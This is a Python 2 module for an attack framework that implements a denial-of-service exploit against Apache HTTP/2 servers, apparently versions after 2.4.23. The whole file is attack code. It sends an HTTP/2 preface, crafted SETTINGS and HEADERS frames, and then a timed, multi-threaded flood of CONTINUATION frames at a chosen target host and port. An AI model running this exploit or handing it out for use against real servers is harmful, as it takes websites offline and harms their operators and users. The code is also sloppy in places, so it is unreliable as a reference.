import sys, struct, socket, time, threading

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (%s)\n" %name
	print "  ID       Device"
	print "  --       ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("apacheDoS","Normal","Apache >2.4.23 Denial of Service")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print "\nPublisher Information for %s" %name
	print
	print "       Name:",name
	print "     Module:",module
	print "   Platform:",plat
	print " Privileged:",priv
	print "    License:",lic
	print "       Rank:",rank
	print "  Disclosed:",release
	print "         By:",by

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

try: RHOST
except: pass
try: RPORT
except: RPORT = 80
try: TIMEOUT
except: TIMEOUT = 5
try: THREADS
except: THREADS = 1
try: DURATION
except: DURATION = 10

def dos(HOST, PORT=80, tid="Thread-1", TIMEOUT=5, DURATION=10):
	socket.setdefaulttimeout(5)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	print "\n\r\r\r[%s] Sending First Packet" %tid
	s.sendall('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
	
	SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00)
	SETTINGS += struct.pack('B', 0x04)
	SETTINGS += struct.pack('B', 0x00)
	SETTINGS += struct.pack('>I', 0x00000000)
	print "\r\r\r[%s] Sending Settings" %tid
	s.sendall(SETTINGS)
	
	HEADER_BLOCK_FRAME = '\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
	HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]
	HEADERS += struct.pack('B', 0x01)
	HEADERS += struct.pack('B', 0x00)
	HEADERS += struct.pack('>I', 0x00000001)
	print "\r\r\r[%s] Sending Header" %tid
	s.sendall(HEADERS + HEADER_BLOCK_FRAME)
	
	print "\r\r\r[%s] Starting DoS" %tid
	start = time.time()
	while time.time() < start + DURATION:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			HEADER_BLOCK_FRAME = '\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
			HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]
			HEADERS += struct.pack('B', 0x09)
			HEADERS += struct.pack('B', 0x01)
			HEADERS += struct.pack('>I', 0x00000001)
			s.sendto(HEADERS + HEADER_BLOCK_FRAME,(HOST,PORT))
		except Exception as e:
			print "\r\r\r[*] %s" %e
			pass
	print "\r\r\r[%s] Ended DoS" %tid

def show_opt():
	print "\nModule Options (axuiliary/apacheDoS)\n"
	print "  Name     Current Setting  Required  Description"
	print "  ----     ---------------  --------  -----------"
	try:
		auto_opt("THREADS",str(THREADS),"no","Total Threads To Run")
	except:
		auto_opt("THREADS","  ","no","Total Threads To Run")
	try:
		auto_opt("RHOST",RHOST,"yes", "Target Host")
	except:
		auto_opt("RHOST","   ","yes", "Target Host")
	try:
		auto_opt("RPORT",str(RPORT),"yes", "Target Port")
	except:
		auto_opt("RPORT","   ","yes", "Target Port")
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	try:
		auto_opt("DURATION", str(DURATION),"yes", "Attack Time")
	except:
		auto_opt("DURATION","   ","yes", "Attack Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			for _ in range(int(THREADS)):
				t = threading.Thread(target=dos,args=(RHOST,int(RPORT),"Thread-"+str(_),int(TIMEOUT),int(DURATION)))
				t.daemon = True
				if RHOST and RPORT and TIMEOUT and THREADS:
					sys.stderr = t.start()
		except Exception as e:
			print "[*] Error While Starting"
			print e
			print
			time.sleep(0.3)
except:
	pass

try:
	if desc == "get-info":
		auto_info(name,"axuiliary/apacheDoS","Python 2.7","No","N/A","Normal","12/12/16","Jungun Baek")
		show_opt()
		targets = {"1":"Apache Website >2.4.23"}
		auto_targ(targets)
except:
	pass
